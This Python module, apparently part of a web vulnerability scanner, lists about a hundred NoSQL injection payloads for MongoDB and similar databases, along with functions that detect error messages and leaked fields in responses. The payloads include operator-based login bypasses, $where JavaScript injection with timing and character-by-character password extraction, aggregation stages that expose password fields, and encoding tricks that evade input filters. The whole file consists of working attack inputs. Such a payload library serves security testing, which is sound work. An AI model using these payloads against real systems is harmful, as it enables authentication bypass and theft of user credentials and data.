"""
scanner/payloads/nosql.py

NoSQL Injection payloads for vulnerability testing.
Covers: MongoDB, CouchDB, Redis, and other NoSQL databases.

Categories:
1. MongoDB operator injection ($gt, $ne, $regex, $where, etc.)
2. JavaScript injection in $where clauses
3. JSON injection variations
4. Array injection
5. Type confusion attacks
6. Blind NoSQL injection
7. Aggregation pipeline injection
8. Filter bypass variations
"""

from .base import Payload


def nosql_confirm(response_text: str) -> bool:
    """
    Check for NoSQL injection indicators in response.
    """
    indicators = [
        # MongoDB errors
        "mongodb",
        "mongoerror",
        "mongo error",
        "bson",
        "objectid",
        "mongoose",
        "$where",
        "$gt",
        "$lt",
        "$ne",
        "$regex",
        "$or",
        "$and",
        "collection",
        "cursor",
        "aggregate",

        # CouchDB errors
        "couchdb",
        "documentnotfounderror",
        "docnotfound",

        # Redis errors
        "redis",
        "rediserror",
        "wrongtype",

        # Generic NoSQL
        "json_decode",
        "json parse error",
        "unexpected token",
        "syntaxerror: unexpected",

        # Additional error patterns
        "bsontype",
        "cannot convert",
        "invalid operator",
        "unknown operator",
        "bad query",
        "query failed",
        "aggregation failed",
    ]

    text_lower = response_text.lower()
    return any(indicator in text_lower for indicator in indicators)


def nosql_boolean_confirm(response_text: str) -> bool:
    """
    Check for boolean-based NoSQL injection success.
    Look for data leakage or authentication bypass indicators.
    """
    indicators = [
        # Data returned that shouldn't be
        '"_id"',
        "'_id'",
        '"password"',
        '"email"',
        '"username"',
        '"admin"',
        '"user"',
        '"role"',
        '"token"',
        '"secret"',
        '"apikey"',
        '"api_key"',
        # Auth bypass indicators
        "welcome",
        "dashboard",
        "logged in",
        "success",
        "authenticated",
        "session",
        "profile",
    ]

    text_lower = response_text.lower()
    return any(indicator.lower() in text_lower for indicator in indicators)


def nosql_timing_confirm(response_text: str) -> bool:
    """
    Check for timing-based NoSQL injection indicators.
    Note: Actual timing analysis should be done at the scanner level.
    """
    # This is a placeholder - timing detection happens at scanner level
    return nosql_confirm(response_text) or nosql_boolean_confirm(response_text)


def nosql_aggregation_confirm(response_text: str) -> bool:
    """
    Check for aggregation pipeline injection indicators.
    """
    indicators = [
        "aggregate",
        "pipeline",
        "$match",
        "$group",
        "$project",
        "$lookup",
        "$unwind",
        "stage",
        "cursor",
        "firstbatch",
    ]
    text_lower = response_text.lower()
    return any(indicator in text_lower for indicator in indicators) or nosql_boolean_confirm(response_text)


NOSQL_PAYLOADS = [
    # ============================================
    # 1. MONGODB OPERATOR INJECTION
    # ============================================
    Payload(
        vuln_type="NoSQL",
        name="MongoDB $ne null operator",
        payload='{"$ne": null}',
        contexts=["json", "form"],
        severity="High",
        safe=True,
        confirmation=nosql_boolean_confirm
    ),
    Payload(
        vuln_type="NoSQL",
        name="MongoDB $ne empty string",
        payload='{"$ne": ""}',
        contexts=["json", "form"],
        severity="High",
        safe=True,
        confirmation=nosql_boolean_confirm
    ),
    Payload(
        vuln_type="NoSQL",
        name="MongoDB $gt empty operator",
        payload='{"$gt": ""}',
        contexts=["json", "form"],
        severity="High",
        safe=True,
        confirmation=nosql_boolean_confirm
    ),
    Payload(
        vuln_type="NoSQL",
        name="MongoDB $gte empty operator",
        payload='{"$gte": ""}',
        contexts=["json", "form"],
        severity="High",
        safe=True,
        confirmation=nosql_boolean_confirm
    ),
    Payload(
        vuln_type="NoSQL",
        name="MongoDB $lt max value",
        payload='{"$lt": "~"}',
        contexts=["json", "form"],
        severity="High",
        safe=True,
        confirmation=nosql_boolean_confirm
    ),
    Payload(
        vuln_type="NoSQL",
        name="MongoDB $lte max value",
        payload='{"$lte": "~"}',
        contexts=["json", "form"],
        severity="High",
        safe=True,
        confirmation=nosql_boolean_confirm
    ),
    Payload(
        vuln_type="NoSQL",
        name="MongoDB $regex wildcard",
        payload='{"$regex": ".*"}',
        contexts=["json", "form"],
        severity="High",
        safe=True,
        confirmation=nosql_boolean_confirm
    ),
    Payload(
        vuln_type="NoSQL",
        name="MongoDB $regex case insensitive",
        payload='{"$regex": ".*", "$options": "i"}',
        contexts=["json", "form"],
        severity="High",
        safe=True,
        confirmation=nosql_boolean_confirm
    ),
    Payload(
        vuln_type="NoSQL",
        name="MongoDB $regex multiline",
        payload='{"$regex": ".*", "$options": "m"}',
        contexts=["json", "form"],
        severity="High",
        safe=True,
        confirmation=nosql_boolean_confirm
    ),
    Payload(
        vuln_type="NoSQL",
        name="MongoDB $regex dotall",
        payload='{"$regex": ".*", "$options": "s"}',
        contexts=["json", "form"],
        severity="High",
        safe=True,
        confirmation=nosql_boolean_confirm
    ),
    Payload(
        vuln_type="NoSQL",
        name="MongoDB $in array bypass",
        payload='{"$in": ["admin", "administrator", "root"]}',
        contexts=["json"],
        severity="High",
        safe=True,
        confirmation=nosql_boolean_confirm
    ),
    Payload(
        vuln_type="NoSQL",
        name="MongoDB $nin exclusion bypass",
        payload='{"$nin": []}',
        contexts=["json"],
        severity="High",
        safe=True,
        confirmation=nosql_boolean_confirm
    ),
    Payload(
        vuln_type="NoSQL",
        name="MongoDB $exists true",
        payload='{"$exists": true}',
        contexts=["json", "form"],
        severity="High",
        safe=True,
        confirmation=nosql_boolean_confirm
    ),
    Payload(
        vuln_type="NoSQL",
        name="MongoDB $exists false",
        payload='{"$exists": false}',
        contexts=["json", "form"],
        severity="High",
        safe=True,
        confirmation=nosql_boolean_confirm
    ),
    Payload(
        vuln_type="NoSQL",
        name="MongoDB $type string",
        payload='{"$type": "string"}',
        contexts=["json"],
        severity="High",
        safe=True,
        confirmation=nosql_boolean_confirm
    ),
    Payload(
        vuln_type="NoSQL",
        name="MongoDB $type number",
        payload='{"$type": 1}',
        contexts=["json"],
        severity="High",
        safe=True,
        confirmation=nosql_boolean_confirm
    ),
    Payload(
        vuln_type="NoSQL",
        name="MongoDB $where true",
        payload='{"$where": "1==1"}',
        contexts=["json", "form"],
        severity="Critical",
        safe=True,
        confirmation=nosql_boolean_confirm
    ),
    Payload(
        vuln_type="NoSQL",
        name="MongoDB $or bypass",
        payload='{"$or": [{"username": "admin"}, {"username": {"$ne": ""}}]}',
        contexts=["json"],
        severity="Critical",
        safe=True,
        confirmation=nosql_boolean_confirm
    ),
    Payload(
        vuln_type="NoSQL",
        name="MongoDB $and bypass",
        payload='{"$and": [{"username": {"$ne": ""}}, {"password": {"$ne": ""}}]}',
        contexts=["json"],
        severity="Critical",
        safe=True,
        confirmation=nosql_boolean_confirm
    ),
    Payload(
        vuln_type="NoSQL",
        name="MongoDB $nor bypass",
        payload='{"$nor": [{"username": "invalid"}]}',
        contexts=["json"],
        severity="High",
        safe=True,
        confirmation=nosql_boolean_confirm
    ),
    Payload(
        vuln_type="NoSQL",
        name="MongoDB $not negation bypass",
        payload='{"$not": {"$eq": "invalid"}}',
        contexts=["json"],
        severity="High",
        safe=True,
        confirmation=nosql_boolean_confirm
    ),
    Payload(
        vuln_type="NoSQL",
        name="MongoDB $elemMatch array",
        payload='{"$elemMatch": {"$gt": ""}}',
        contexts=["json"],
        severity="High",
        safe=True,
        confirmation=nosql_boolean_confirm
    ),
    Payload(
        vuln_type="NoSQL",
        name="MongoDB $all array",
        payload='{"$all": [{"$elemMatch": {"$gt": ""}}]}',
        contexts=["json"],
        severity="High",
        safe=True,
        confirmation=nosql_boolean_confirm
    ),
    Payload(
        vuln_type="NoSQL",
        name="MongoDB $size array length",
        payload='{"$size": 0}',
        contexts=["json"],
        severity="High",
        safe=True,
        confirmation=nosql_boolean_confirm
    ),

    # ============================================
    # 2. JAVASCRIPT INJECTION IN $where CLAUSES
    # ============================================
    Payload(
        vuln_type="NoSQL",
        name="JS $where sleep timing",
        payload='{"$where": "sleep(5000)"}',
        contexts=["json"],
        severity="Critical",
        safe=True,
        confirmation=nosql_timing_confirm
    ),
    Payload(
        vuln_type="NoSQL",
        name="JS $where this.password",
        payload='{"$where": "this.password.match(/.*/)"}',
        contexts=["json"],
        severity="Critical",
        safe=True,
        confirmation=nosql_boolean_confirm
    ),
    Payload(
        vuln_type="NoSQL",
        name="JS $where return true",
        payload='{"$where": "return true"}',
        contexts=["json"],
        severity="Critical",
        safe=True,
        confirmation=nosql_boolean_confirm
    ),
    Payload(
        vuln_type="NoSQL",
        name="JS $where function true",
        payload='{"$where": "function() { return true; }"}',
        contexts=["json"],
        severity="Critical",
        safe=True,
        confirmation=nosql_boolean_confirm
    ),
    Payload(
        vuln_type="NoSQL",
        name="JS $where object keys",
        payload='{"$where": "Object.keys(this).length > 0"}',
        contexts=["json"],
        severity="Critical",
        safe=True,
        confirmation=nosql_boolean_confirm
    ),
    Payload(
        vuln_type="NoSQL",
        name="JS $where field comparison",
        payload='{"$where": "this.username == this.username"}',
        contexts=["json"],
        severity="Critical",
        safe=True,
        confirmation=nosql_boolean_confirm
    ),
    Payload(
        vuln_type="NoSQL",
        name="JS $where typeof check",
        payload='{"$where": "typeof this.password === \'string\'"}',
        contexts=["json"],
        severity="Critical",
        safe=True,
        confirmation=nosql_boolean_confirm
    ),
    Payload(
        vuln_type="NoSQL",
        name="JS $where hasOwnProperty",
        payload='{"$where": "this.hasOwnProperty(\'password\')"}',
        contexts=["json"],
        severity="Critical",
        safe=True,
        confirmation=nosql_boolean_confirm
    ),
    Payload(
        vuln_type="NoSQL",
        name="JS $where tojson",
        payload='{"$where": "tojson(this).length > 0"}',
        contexts=["json"],
        severity="Critical",
        safe=True,
        confirmation=nosql_boolean_confirm
    ),
    Payload(
        vuln_type="NoSQL",
        name="JS $where db reference",
        payload='{"$where": "db.version()"}',
        contexts=["json"],
        severity="Critical",
        safe=True,
        confirmation=nosql_confirm
    ),

    # ============================================
    # 3. JSON INJECTION VARIATIONS
    # ============================================
    Payload(
        vuln_type="NoSQL",
        name="JSON nested $ne",
        payload='{"password": {"$ne": 1}}',
        contexts=["json"],
        severity="High",
        safe=True,
        confirmation=nosql_boolean_confirm
    ),
    Payload(
        vuln_type="NoSQL",
        name="JSON nested $gt",
        payload='{"password": {"$gt": ""}}',
        contexts=["json"],
        severity="High",
        safe=True,
        confirmation=nosql_boolean_confirm
    ),
    Payload(
        vuln_type="NoSQL",
        name="JSON auth bypass combo",
        payload='{"username": {"$gt": ""}, "password": {"$gt": ""}}',
        contexts=["json"],
        severity="Critical",
        safe=True,
        confirmation=nosql_boolean_confirm
    ),
    Payload(
        vuln_type="NoSQL",
        name="JSON prototype pollution attempt",
        payload='{"__proto__": {"admin": true}}',
        contexts=["json"],
        severity="Critical",
        safe=True,
        confirmation=nosql_boolean_confirm
    ),
    Payload(
        vuln_type="NoSQL",
        name="JSON constructor pollution",
        payload='{"constructor": {"prototype": {"admin": true}}}',
        contexts=["json"],
        severity="Critical",
        safe=True,
        confirmation=nosql_boolean_confirm
    ),
    Payload(
        vuln_type="NoSQL",
        name="JSON deep nested operator",
        payload='{"user": {"profile": {"role": {"$ne": "user"}}}}',
        contexts=["json"],
        severity="High",
        safe=True,
        confirmation=nosql_boolean_confirm
    ),
    Payload(
        vuln_type="NoSQL",
        name="JSON mixed operators",
        payload='{"$or": [{"admin": true}, {"role": {"$regex": "admin"}}]}',
        contexts=["json"],
        severity="Critical",
        safe=True,
        confirmation=nosql_boolean_confirm
    ),
    Payload(
        vuln_type="NoSQL",
        name="JSON null injection",
        payload='{"password": null, "$or": [{}]}',
        contexts=["json"],
        severity="High",
        safe=True,
        confirmation=nosql_boolean_confirm
    ),

    # ============================================
    # 4. ARRAY INJECTION (URL/FORM PARAMETERS)
    # ============================================
    Payload(
        vuln_type="NoSQL",
        name="Array param $ne",
        payload='[$ne]=1',
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=nosql_boolean_confirm
    ),
    Payload(
        vuln_type="NoSQL",
        name="Array param $gt",
        payload='[$gt]=',
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=nosql_boolean_confirm
    ),
    Payload(
        vuln_type="NoSQL",
        name="Array param $gte",
        payload='[$gte]=',
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=nosql_boolean_confirm
    ),
    Payload(
        vuln_type="NoSQL",
        name="Array param $lt",
        payload='[$lt]=~',
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=nosql_boolean_confirm
    ),
    Payload(
        vuln_type="NoSQL",
        name="Array param $regex",
        payload='[$regex]=.*',
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=nosql_boolean_confirm
    ),
    Payload(
        vuln_type="NoSQL",
        name="Array param $regex with options",
        payload='[$regex]=.*&[$options]=i',
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=nosql_boolean_confirm
    ),
    Payload(
        vuln_type="NoSQL",
        name="Array param $exists",
        payload='[$exists]=true',
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=nosql_boolean_confirm
    ),
    Payload(
        vuln_type="NoSQL",
        name="Array param $in",
        payload='[$in][]=admin&[$in][]=root',
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=nosql_boolean_confirm
    ),
    Payload(
        vuln_type="NoSQL",
        name="Array param $nin empty",
        payload='[$nin]=',
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=nosql_boolean_confirm
    ),
    Payload(
        vuln_type="NoSQL",
        name="Array param $where",
        payload='[$where]=1==1',
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=nosql_boolean_confirm
    ),

    # ============================================
    # 5. TYPE CONFUSION ATTACKS
    # ============================================
    Payload(
        vuln_type="NoSQL",
        name="Type confusion integer",
        payload='{"password": 0}',
        contexts=["json"],
        severity="High",
        safe=True,
        confirmation=nosql_boolean_confirm
    ),
    Payload(
        vuln_type="NoSQL",
        name="Type confusion boolean true",
        payload='{"password": true}',
        contexts=["json"],
        severity="High",
        safe=True,
        confirmation=nosql_boolean_confirm
    ),
    Payload(
        vuln_type="NoSQL",
        name="Type confusion boolean false",
        payload='{"password": false}',
        contexts=["json"],
        severity="High",
        safe=True,
        confirmation=nosql_boolean_confirm
    ),
    Payload(
        vuln_type="NoSQL",
        name="Type confusion null",
        payload='{"password": null}',
        contexts=["json"],
        severity="High",
        safe=True,
        confirmation=nosql_boolean_confirm
    ),
    Payload(
        vuln_type="NoSQL",
        name="Type confusion empty array",
        payload='{"password": []}',
        contexts=["json"],
        severity="High",
        safe=True,
        confirmation=nosql_boolean_confirm
    ),
    Payload(
        vuln_type="NoSQL",
        name="Type confusion empty object",
        payload='{"password": {}}',
        contexts=["json"],
        severity="High",
        safe=True,
        confirmation=nosql_boolean_confirm
    ),
    Payload(
        vuln_type="NoSQL",
        name="Type confusion array with value",
        payload='{"password": ["", null, true]}',
        contexts=["json"],
        severity="High",
        safe=True,
        confirmation=nosql_boolean_confirm
    ),
    Payload(
        vuln_type="NoSQL",
        name="Type confusion undefined simulation",
        payload='{"password": {"$type": 6}}',
        contexts=["json"],
        severity="High",
        safe=True,
        confirmation=nosql_boolean_confirm
    ),
    Payload(
        vuln_type="NoSQL",
        name="Type confusion negative number",
        payload='{"password": -1}',
        contexts=["json"],
        severity="High",
        safe=True,
        confirmation=nosql_boolean_confirm
    ),
    Payload(
        vuln_type="NoSQL",
        name="Type confusion float",
        payload='{"password": 0.0}',
        contexts=["json"],
        severity="High",
        safe=True,
        confirmation=nosql_boolean_confirm
    ),

    # ============================================
    # 6. BLIND NOSQL INJECTION
    # ============================================
    Payload(
        vuln_type="NoSQL",
        name="Blind regex char extract a",
        payload='{"$regex": "^a"}',
        contexts=["json"],
        severity="High",
        safe=True,
        confirmation=nosql_boolean_confirm
    ),
    Payload(
        vuln_type="NoSQL",
        name="Blind regex char extract admin",
        payload='{"$regex": "^admin"}',
        contexts=["json"],
        severity="High",
        safe=True,
        confirmation=nosql_boolean_confirm
    ),
    Payload(
        vuln_type="NoSQL",
        name="Blind regex length check",
        payload='{"$regex": "^.{8}$"}',
        contexts=["json"],
        severity="High",
        safe=True,
        confirmation=nosql_boolean_confirm
    ),
    Payload(
        vuln_type="NoSQL",
        name="Blind $where timing",
        payload='{"$where": "if(this.username==\'admin\')sleep(5000)"}',
        contexts=["json"],
        severity="Critical",
        safe=True,
        confirmation=nosql_timing_confirm
    ),
    Payload(
        vuln_type="NoSQL",
        name="Blind $where conditional",
        payload='{"$where": "this.username.length > 0"}',
        contexts=["json"],
        severity="Critical",
        safe=True,
        confirmation=nosql_boolean_confirm
    ),
    Payload(
        vuln_type="NoSQL",
        name="Blind regex wildcard prefix",
        payload='{"$regex": "^.*admin.*$"}',
        contexts=["json"],
        severity="High",
        safe=True,
        confirmation=nosql_boolean_confirm
    ),
    Payload(
        vuln_type="NoSQL",
        name="Blind $where charAt extraction",
        payload='{"$where": "this.password.charAt(0)==\'a\'"}',
        contexts=["json"],
        severity="Critical",
        safe=True,
        confirmation=nosql_boolean_confirm
    ),
    Payload(
        vuln_type="NoSQL",
        name="Blind $where substring",
        payload='{"$where": "this.password.substring(0,1)==\'a\'"}',
        contexts=["json"],
        severity="Critical",
        safe=True,
        confirmation=nosql_boolean_confirm
    ),

    # ============================================
    # 7. AGGREGATION PIPELINE INJECTION
    # ============================================
    Payload(
        vuln_type="NoSQL",
        name="Aggregation $match bypass",
        payload='[{"$match": {"$or": [{}]}}]',
        contexts=["json"],
        severity="Critical",
        safe=True,
        confirmation=nosql_aggregation_confirm
    ),
    Payload(
        vuln_type="NoSQL",
        name="Aggregation $lookup injection",
        payload='[{"$lookup": {"from": "users", "localField": "id", "foreignField": "_id", "as": "data"}}]',
        contexts=["json"],
        severity="Critical",
        safe=True,
        confirmation=nosql_aggregation_confirm
    ),
    Payload(
        vuln_type="NoSQL",
        name="Aggregation $group extraction",
        payload='[{"$group": {"_id": "$password"}}]',
        contexts=["json"],
        severity="Critical",
        safe=True,
        confirmation=nosql_aggregation_confirm
    ),
    Payload(
        vuln_type="NoSQL",
        name="Aggregation $project expose",
        payload='[{"$project": {"password": 1, "email": 1}}]',
        contexts=["json"],
        severity="Critical",
        safe=True,
        confirmation=nosql_aggregation_confirm
    ),
    Payload(
        vuln_type="NoSQL",
        name="Aggregation $unwind array",
        payload='[{"$unwind": "$roles"}]',
        contexts=["json"],
        severity="High",
        safe=True,
        confirmation=nosql_aggregation_confirm
    ),
    Payload(
        vuln_type="NoSQL",
        name="Aggregation $addFields injection",
        payload='[{"$addFields": {"isAdmin": true}}]',
        contexts=["json"],
        severity="Critical",
        safe=True,
        confirmation=nosql_aggregation_confirm
    ),
    Payload(
        vuln_type="NoSQL",
        name="Aggregation $replaceRoot",
        payload='[{"$replaceRoot": {"newRoot": "$sensitiveData"}}]',
        contexts=["json"],
        severity="Critical",
        safe=True,
        confirmation=nosql_aggregation_confirm
    ),
    Payload(
        vuln_type="NoSQL",
        name="Aggregation $out to collection",
        payload='[{"$match": {}}, {"$out": "exfil"}]',
        contexts=["json"],
        severity="Critical",
        safe=True,
        confirmation=nosql_aggregation_confirm
    ),

    # ============================================
    # 8. FILTER BYPASS VARIATIONS
    # ============================================
    Payload(
        vuln_type="NoSQL",
        name="String OR bypass",
        payload="' || '1'=='1",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=nosql_boolean_confirm
    ),
    Payload(
        vuln_type="NoSQL",
        name="String AND bypass",
        payload="' && '1'=='1",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=nosql_boolean_confirm
    ),
    Payload(
        vuln_type="NoSQL",
        name="Comment injection",
        payload="admin'//",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=nosql_boolean_confirm
    ),
    Payload(
        vuln_type="NoSQL",
        name="URL encoded $ne",
        payload='%7B%22%24ne%22%3Anull%7D',
        contexts=["url"],
        severity="High",
        safe=True,
        confirmation=nosql_boolean_confirm
    ),
    Payload(
        vuln_type="NoSQL",
        name="URL encoded $gt",
        payload='%7B%22%24gt%22%3A%22%22%7D',
        contexts=["url"],
        severity="High",
        safe=True,
        confirmation=nosql_boolean_confirm
    ),
    Payload(
        vuln_type="NoSQL",
        name="URL encoded $regex",
        payload='%7B%22%24regex%22%3A%22.*%22%7D',
        contexts=["url"],
        severity="High",
        safe=True,
        confirmation=nosql_boolean_confirm
    ),
    Payload(
        vuln_type="NoSQL",
        name="Double URL encoded $ne",
        payload='%257B%2522%2524ne%2522%253Anull%257D',
        contexts=["url"],
        severity="High",
        safe=True,
        confirmation=nosql_boolean_confirm
    ),
    Payload(
        vuln_type="NoSQL",
        name="Unicode $ne",
        payload='{\u0022$ne\u0022: null}',
        contexts=["json"],
        severity="High",
        safe=True,
        confirmation=nosql_boolean_confirm
    ),
    Payload(
        vuln_type="NoSQL",
        name="Unicode escape $gt",
        payload='{\u0022$gt\u0022: \u0022\u0022}',
        contexts=["json"],
        severity="High",
        safe=True,
        confirmation=nosql_boolean_confirm
    ),
    Payload(
        vuln_type="NoSQL",
        name="Hex encoded operator",
        payload='{"\\x24ne": null}',
        contexts=["json"],
        severity="High",
        safe=True,
        confirmation=nosql_boolean_confirm
    ),
    Payload(
        vuln_type="NoSQL",
        name="Mixed case bypass attempt",
        payload='{"$Ne": null}',
        contexts=["json"],
        severity="High",
        safe=True,
        confirmation=nosql_boolean_confirm
    ),
    Payload(
        vuln_type="NoSQL",
        name="Whitespace injection",
        payload='{ "$ne" : null }',
        contexts=["json"],
        severity="High",
        safe=True,
        confirmation=nosql_boolean_confirm
    ),
    Payload(
        vuln_type="NoSQL",
        name="Tab character bypass",
        payload='{\t"$ne":\tnull\t}',
        contexts=["json"],
        severity="High",
        safe=True,
        confirmation=nosql_boolean_confirm
    ),
    Payload(
        vuln_type="NoSQL",
        name="Newline bypass",
        payload='{\n"$ne":\nnull\n}',
        contexts=["json"],
        severity="High",
        safe=True,
        confirmation=nosql_boolean_confirm
    ),
    Payload(
        vuln_type="NoSQL",
        name="Comment in JSON bypass",
        payload='{"$ne": null/*comment*/}',
        contexts=["json"],
        severity="High",
        safe=True,
        confirmation=nosql_boolean_confirm
    ),
    Payload(
        vuln_type="NoSQL",
        name="BSON injection ObjectId",
        payload='{"_id": {"$oid": "000000000000000000000000"}}',
        contexts=["json"],
        severity="High",
        safe=True,
        confirmation=nosql_boolean_confirm
    ),
    Payload(
        vuln_type="NoSQL",
        name="BSON date injection",
        payload='{"created": {"$date": "1970-01-01T00:00:00.000Z"}}',
        contexts=["json"],
        severity="High",
        safe=True,
        confirmation=nosql_boolean_confirm
    ),
    Payload(
        vuln_type="NoSQL",
        name="Double dollar bypass",
        payload='{"$$ne": null}',
        contexts=["json"],
        severity="High",
        safe=True,
        confirmation=nosql_boolean_confirm
    ),

    # ============================================
    # ADDITIONAL BYPASS TECHNIQUES
    # ============================================
    Payload(
        vuln_type="NoSQL",
        name="Bracket notation injection",
        payload='username[$ne]=&password[$ne]=',
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=nosql_boolean_confirm
    ),
    Payload(
        vuln_type="NoSQL",
        name="Dot notation injection",
        payload='user.password[$ne]=',
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=nosql_boolean_confirm
    ),
    Payload(
        vuln_type="NoSQL",
        name="Array index injection",
        payload='users[0][$ne]=',
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=nosql_boolean_confirm
    ),
    Payload(
        vuln_type="NoSQL",
        name="PHP array syntax",
        payload='password[$ne]=null',
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=nosql_boolean_confirm
    ),
    Payload(
        vuln_type="NoSQL",
        name="Express.js body parser bypass",
        payload='{"username": "admin", "password[$ne]": ""}',
        contexts=["json"],
        severity="High",
        safe=True,
        confirmation=nosql_boolean_confirm
    ),
]
